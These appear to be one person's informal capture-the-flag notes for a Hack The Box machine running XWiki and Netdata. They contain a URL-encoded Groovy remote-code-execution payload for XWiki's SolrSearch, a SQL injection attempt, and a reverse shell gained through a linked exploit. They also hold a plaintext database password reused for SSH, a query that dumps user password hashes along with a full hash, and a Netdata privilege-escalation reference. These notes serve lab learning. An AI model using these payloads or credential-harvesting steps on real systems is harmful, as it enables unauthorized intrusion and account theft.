___



*ports open*
22
80
8080



8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20


*found poc for this*
http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async%20async=false}}{{groovy}}println(%22Exploit%20Successful!%20Result:%20%22%20+%20(23%20+%2019)){{/groovy}}{{/async}}


*this crashes*


*this looks like it worked SQL injection*
http://10.10.11.80:8080/xwiki/rest/liveData/sources/liveTable/entries?sourceParams.template=getdeleteddocuments.vm&sort=injected



Exception while executing query. Query statement = [SELECT ddoc.id FROM XWikiDeletedDocument as ddoc WHERE 1=1 order by SHOW TABLES; asc]



*this works*
https://github.com/advisories/GHSA-rr6p-3pfg-562j

`<host>/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28"Hello%20from"%20%2B%20"%20search%20text%3A"%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20`



# this one worked
https://github.com/gunzf0x/CVE-2025-24893

*i have a rev shell!!! yaya*




*hybernate cfg file *

    <property name="hibernate.connection.url">jdbc:mysql://localhost/xwiki?useSSL=false&amp;connectionTimeZone=LOCAL&amp;allowPublicKeyRetrieval=true</property>
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>




| caching_sha2_password | $A$005$bvqg> |
| --------------------- | ------------ |
| 8                     |              |
|                       |              |

*chat pulled in clutch rn bc wtf*

SELECT username, password_hash FROM ((SELECT d.XWD_FULLNAME AS username, s.XWS_VALUE AS password_hash FROM xwikiobjects o JOIN xwikiproperties p ON o.XWO_ID = p.XWP_ID JOIN xwikistrings s ON p.XWP_ID = s.XWS_ID JOIN xwikidoc d ON d.XWD_FULLNAME = o.XWO_NAME WHERE o.XWO_CLASSNAME = 'XWiki.XWikiUsers' AND p.XWP_NAME = 'password' AND p.XWP_CLASSTYPE = 'com.xpn.xwiki.objects.StringProperty') UNION ALL (SELECT d.XWD_FULLNAME AS username, xl.XWL_VALUE AS password_hash FROM xwikiobjects o JOIN xwikiproperties p ON o.XWO_ID = p.XWP_ID JOIN xwikilargestrings xl ON xl.XWL_ID = p.XWP_ID JOIN xwikidoc d ON d.XWD_FULLNAME = o.XWO_NAME WHERE o.XWO_CLASSNAME = 'XWiki.XWikiUsers' AND p.XWP_NAME = 'password' AND p.XWP_CLASSTYPE LIKE '%LargeStringProperty%')) t ORDER BY username;





*hash*
| XWiki.neal | hash:SHA-512:dac65976a9f09bcd15bd2c5c6eae4c43b06f316be7ae6b191db26580b1211bef:6b8f547e3742e998380da4f9d426773430a7982a946b9bfd94da0d7abe0d472c5ff08fcb8b0a908bc293da82298053ba348872099bd88f059a7838c38b670153 |
| ---------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| XWiki.neal | Bagwell                                                                                                                                                                                                        |
| XWiki.neal |                                                                                                                                                                                                                |
| XWiki.neal |                                                                                                                                                                                                                |
| XWiki.neal | Neal                                                                                                                                                                                                           |
| XWiki.neal | neal@editor.htb                                                                                                                         




*this was the password for oliver on ssh brughhhhhh*
theEd1t0rTeam99


*is this it?*
Netdata Agent: v1.45.2



*this is it*
https://github.com/AliElKhatteb/CVE-2024-32019-POC



NETDATA is pretty cool for system monitoring ngl, the agents and then the main cloud controller ptty cool